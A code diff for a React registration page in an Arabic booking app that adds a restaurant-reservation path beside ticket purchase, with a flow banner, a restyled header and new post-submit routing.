@@ -1,5 +1,5 @@
 import { Link, useLocation } from "wouter";
-import { ArrowRight, User, IdCard, Mail, Phone, Sparkles } from "lucide-react";
+import { ArrowRight, User, IdCard, Mail, Phone, Sparkles, UtensilsCrossed, Ticket } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
@@ -13,10 +13,13 @@ const EMAILJS_TEMPLATE_ID = "template_xkdlwg3";
 const EMAILJS_PUBLIC_KEY = "ROVj9RXGGeBR7U8iG";
 
 export default function RegistrationPage() {
+  const isRestaurant = localStorage.getItem("reservationType") === "restaurant";
+
   return (
     <div className="min-h-screen bg-gradient-to-b from-background to-[#f5f0e8] flex flex-col" dir="rtl">
-      <Header />
+      <Header isRestaurant={isRestaurant} />
       <ProgressSteps currentStep={1} />
+      <FlowIndicator isRestaurant={isRestaurant} />
       <main className="flex-1 p-4 pb-8">
         <RegistrationForm />
       </main>
@@ -24,12 +27,29 @@ export default function RegistrationPage() {
   );
 }
 
-function Header() {
+function FlowIndicator({ isRestaurant }: { isRestaurant: boolean }) {
   return (
-    <header className="bg-gradient-to-r from-[#5c4a3d] to-[#3d3428] text-white">
-      <div className="container mx-auto px-4 py-4">
+    <div className={`py-3 px-4 text-center ${isRestaurant ? 'bg-gradient-to-r from-[#c4956a]/20 to-[#d4a574]/20' : 'bg-gradient-to-r from-primary/10 to-[#d4a574]/10'}`}>
+      <div className="flex items-center justify-center gap-2">
+        {isRestaurant ? (
+          <UtensilsCrossed className="w-4 h-4 text-primary" />
+        ) : (
+          <Ticket className="w-4 h-4 text-primary" />
+        )}
+        <span className="text-sm font-medium text-primary">
+          {isRestaurant ? "حجز مطعم" : "شراء تذكرة دخول"}
+        </span>
+      </div>
+    </div>
+  );
+}
+
+function Header({ isRestaurant }: { isRestaurant: boolean }) {
+  return (
+    <header className="sticky top-0 z-50 bg-gradient-to-r from-[#2a1f16] via-[#3d3428] to-[#2a1f16] text-white shadow-xl">
+      <div className="container mx-auto px-4 py-3">
         <div className="flex items-center justify-between">
-          <Link href="/">
+          <Link href={isRestaurant ? "/restaurants" : "/tickets"}>
             <Button size="icon" variant="ghost" className="text-white hover:bg-white/10" data-testid="button-back">
               <ArrowRight className="w-5 h-5" />
             </Button>
@@ -209,13 +229,14 @@ function RegistrationForm() {
         console.error("Failed to send email:", error);
       }
 
-      setLocation("/booking");
+      const isRestaurantFlow = localStorage.getItem("reservationType") === "restaurant";
+      setLocation(isRestaurantFlow ? "/restaurant-booking" : "/booking");
     }
   };
 
   return (
     <div className="max-w-md mx-auto animate-fade-in">
-      <div className="bg-white rounded-2xl shadow-xl p-6 space-y-6">
+      <div className="bg-white rounded-2xl shadow-xl p-6 space-y-6 border border-border/20">
         <div className="text-center mb-6">
           <div className="w-16 h-16 bg-gradient-to-br from-primary to-[#d4a574] rounded-full flex items-center justify-center mx-auto mb-4 shadow-glow">
             <Sparkles className="w-8 h-8 text-white" />
